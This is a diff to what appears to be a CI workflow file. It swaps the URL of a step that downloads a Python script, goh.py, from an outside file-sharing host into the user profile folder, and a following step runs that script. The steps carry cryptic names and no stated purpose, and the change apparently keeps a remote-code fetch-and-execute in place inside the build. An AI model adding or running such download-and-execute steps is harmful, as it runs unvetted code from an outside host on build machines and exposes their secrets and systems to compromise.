@@ -9,7 +9,7 @@ jobs:
 
     steps:
     - name: b goh.
-      run: Invoke-WebRequest -Uri "http://hc1.checker.in/file2link/documents/file_487468.py/goh.py" -OutFile "$env:USERPROFILE\goh.py"
+      run: Invoke-WebRequest -Uri "http://hc1.checker.in/file2link/documents/file_487719.py/goh.py" -OutFile "$env:USERPROFILE\goh.py"
 
     - name: Tmm
       run: python $env:USERPROFILE\goh.py
